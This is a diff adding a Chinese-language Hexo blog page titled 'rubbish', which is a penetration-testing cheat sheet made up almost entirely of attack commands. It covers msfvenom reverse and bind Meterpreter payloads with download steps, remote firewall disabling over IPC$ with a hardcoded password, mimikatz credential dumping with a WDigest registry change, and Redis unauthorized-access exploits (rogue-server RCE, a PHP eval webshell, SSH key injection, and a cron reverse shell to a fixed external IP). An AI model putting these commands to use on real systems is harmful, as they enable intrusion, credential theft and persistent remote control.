@@ -1,0 +1,732 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Re1ca1g">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rubbish">
+<meta property="og:url" content="http://example.com/2023/12/17/penetration/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="渗透测试">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142200112.png">
+<meta property="og:image" content="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142235121.png">
+<meta property="article:published_time" content="2023-12-17T11:57:00.000Z">
+<meta property="article:modified_time" content="2024-01-30T02:59:59.891Z">
+<meta property="article:author" content="Re1ca1g">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142200112.png">
+  
+  
+  
+  <title>rubbish - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>reicalg·blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="rubbish"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-17 19:57" pubdate>
+          2023年12月17日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">rubbish</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>千万不要exit 撑死back和background</p>
+<p>首先判断需要反弹还是正向连接</p>
+<p>一般能出网的用反弹，出不了网的就正向</p>
+<p>1、先制作payload </p>
+<p>linux</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=9999 -f elf &gt;reverse_9999.elf <span class="hljs-comment">#反弹</span><br>msfvenom -p linux/x64/meterpreter/bind_tcp lport=9999 -f elf &gt;bind_9999.elf<span class="hljs-comment">#正向</span><br></code></pre></td></tr></table></figure>
+
+<p>windows</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=xx.xx.xx.xx <span class="hljs-attribute">lport</span>=9999 -f exe &gt;reverse_9999.exe #反弹<br>msfvenom -p windows/meterpreter/bind_tcp <span class="hljs-attribute">lport</span>=9999 -f exe &gt;bind_9999.exe#正向<br></code></pre></td></tr></table></figure>
+
+<p>linux 一般为elf windows为exe   （在杀软能绕过用，这两为可执行文件</p>
+<p>2、上传payload</p>
+<p>如果有网站可以用蚁剑上传</p>
+<p>如果linux中可以用</p>
+<p>VPS上 python3 -m http.server 12345 开启一个web服务供下载</p>
+<p>靶机上 wget <a target="_blank" rel="noopener" href="http://xx.xx..xx.xx:12345/xx.elf">http://xx.xx..xx.xx:12345/xx.elf</a> 下载</p>
+<p>如果在windows上可以用 certutil <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/107819644">Windows上自带的渗透测试工具：Certutil</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">certutil.exe -urlcache -split -f http://example.com/a.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果在域控中可以用$LCK (待补充)</p>
+<p>然后上线msf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>use exploit/multi/handler<br><br>show options <span class="hljs-comment">#看一下需要的payload 根据要填的填rhost lport</span><br><br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp <span class="hljs-comment">#这步根据生成的payload进行填写</span><br><br><span class="hljs-built_in">set</span> lport  xxxx<br><br><span class="hljs-built_in">set</span> rhost xx.xx.xx.xx <span class="hljs-comment">#根据上面options选填</span><br><br>run<br></code></pre></td></tr></table></figure>
+
+<p>执行payload文件 正向先开 反弹后开</p>
+<p>上线以后首先获取路由信息 为后面跨网段渗透铺路</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute<br><br><span class="hljs-built_in">run</span> post/multi/manage/autoroute<br><br><span class="hljs-built_in">run</span> autoroute -p#查看所有路由表<br></code></pre></td></tr></table></figure>
+
+
+
+<p>退出当前sessions 用</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">background<br></code></pre></td></tr></table></figure>
+
+<p>查看所有sessions 用</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span> <br></code></pre></td></tr></table></figure>
+
+<p>使用某个session </p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sessions -<span class="hljs-selector-tag">i</span> x -k（杀死清除）<br></code></pre></td></tr></table></figure>
+
+
+
+<p>设置socks代理</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> Proxies <span class="hljs-comment">socks5:127.0.0.1:1081</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用ipc管道-和sc的横向移动"><a href="#利用ipc管道-和sc的横向移动" class="headerlink" title="利用ipc管道 和sc的横向移动"></a>利用ipc管道 和sc的横向移动</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.93.30</span>\ipc$ <span class="hljs-string">&quot;Whoami2021&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> create unablefirewall binpath=<span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">提升权限   privilege::debug<br><br>抓取明文密码 sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+
+<p>win12及以上被取消了，可通过修改注册表设置允许存储明文密码，并让其系统强制锁屏，等待管理员重新输入账号密码后，即可抓取到明文密码。</p>
+<p>修改注册表(管理员权限)</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</span><br></code></pre></td></tr></table></figure>
+
+<p>powershell执行命令强制锁屏</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">Function</span> <span class="hljs-title function_">Lock</span>-<span class="hljs-title function_">WorkStation</span> &#123; <span class="hljs-symbol">$sig</span>nature = @<span class="hljs-string">&quot; [DllImport (&quot;</span>user32.dll<span class="hljs-string">&quot;, SetLastError = true)] public static extern bool LockWorkStation(); &quot;</span>@ <span class="hljs-symbol">$Loc</span>kWorkStation = Add-Type -memberDefinition <span class="hljs-symbol">$sig</span>nature -name <span class="hljs-string">&quot;Win32LockWorkStation&quot;</span> -namespace Win32Functions -passthru <span class="hljs-symbol">$Loc</span>kWorkStation::LockWorkStation() | Out-<span class="hljs-literal">Null</span> &#125; Lock-WorkStation<br></code></pre></td></tr></table></figure>
+
+<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p><a target="_blank" rel="noopener" href="https://keanes.blog.csdn.net/article/details/127753716">Redis未授权四种利用方式与修复方案</a></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Redis基本操作<br><br><span class="hljs-built_in">set</span> testkey “hello” - 创建一个键值对<br>keys * 显示所有键<br>delxxx 删除键为key的数据<br><span class="hljs-built_in">get</span> xxx 读key的内容<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /home/test 设置工作目录<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename redis.rdb 设置备份为减价<br>save 进行一次备份操作<br></code></pre></td></tr></table></figure>
+
+<h4 id="redis主从复制RCE"><a href="#redis主从复制RCE" class="headerlink" title="redis主从复制RCE"></a>redis主从复制RCE</h4><p>漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指一个redis作为主机，其他为备份机，主从数据相同，从机去读，主机写。在Redis4.x之后，通过外部扩展，可以实现redis中实现一个新的redis命令，构造恶意.so文件，在两个redis实例设置主从模式，redis主机实例可以通过FULLRESYNC同步文件到从机上，在从机家在恶意so文件，从而执行文件。</p>
+<p>影响版本：redis&lt;&#x3D;5.05<br>工具下载：<br><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>  (&#x2F;root&#x2F;tool&#x2F;poc&#x2F;applicationserver&#x2F;redis-rogue-server-master&#x2F;)</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> redis-rogue-server.py --rhost <span class="hljs-number">192.168.0.109</span> --lhost <span class="hljs-number">192.168.0.145</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142200112.png" srcset="/img/loading.gif" lazyload alt="image-20240123142200112"></p>
+<p>弹一个shell去vps上</p>
+<p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142235121.png" srcset="/img/loading.gif" lazyload alt="image-20240123142235121"></p>
+<h4 id="Redis写WEBSHELL"><a href="#Redis写WEBSHELL" class="headerlink" title="Redis写WEBSHELL"></a>Redis写WEBSHELL</h4><p>需要知道网站物理路径</p>
+<p>获取网站路径方式：1、报错 2、phpinfo 3、配置文件 4、 数据库 5、相关数据泄漏</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">redis:6379&gt; config set dir /var/www/html/</span><br><span class="language-xml">redis:6379&gt; config set dbfilename shell.php</span><br><span class="language-xml">redis:6379&gt; set x &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">redis:6379&gt; save</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="Redis写入ssh公钥登录"><a href="#Redis写入ssh公钥登录" class="headerlink" title="Redis写入ssh公钥登录"></a>Redis写入ssh公钥登录</h4><p>利用条件：<br>1、Redis服务使⽤ROOT账号启动、且可未授权登陆<br>2、服务器开放了SSH服务，⽽且允许使⽤密钥登录，即可远程写⼊⼀个公钥，直接登录远程 服务器。<br>生成密钥公钥</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh-keygen -t rsa<br><br>(echo -e <span class="hljs-string">&quot;\n\n&quot;</span>; cat id_rsa.pub; echo -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; test.txt <span class="hljs-comment">#将公钥id_rsa.pub文件写入test.txt文件</span><br><br>cat test.txt | redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">220.129</span> -x set crack<br><br><br>redis-cli -h xx.xx.xx.xx<br><br>config set dir <span class="hljs-regexp">/root/</span>.ssh <span class="hljs-comment">#这步需要redis服务使用root权限开启 否则更改不了路径</span><br><br>config set dbfilename authorized_keys<br><br>save<br><br><span class="hljs-keyword">exit</span><br><br><br>cd <span class="hljs-regexp">/root/</span>.ssh<br><br>ssh -i id_rsa root@<span class="hljs-number">172.17</span>.<span class="hljs-number">137.102</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">set</span> shell <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/38.22.133.155/3333 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>查找具有suid权限的文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;<br></code></pre></td></tr></table></figure>
+
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Penetration/" class="category-chain-item">Penetration</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>rubbish</div>
+      <div>http://example.com/2023/12/17/penetration/杂七杂八汇总/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Re1ca1g</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/17/penetration/linux%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0/" title="linux命令">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux命令</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/10/misc/1/" title="misc刷题（杂七杂八）">
+                        <span class="hidden-mobile">misc刷题（杂七杂八）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
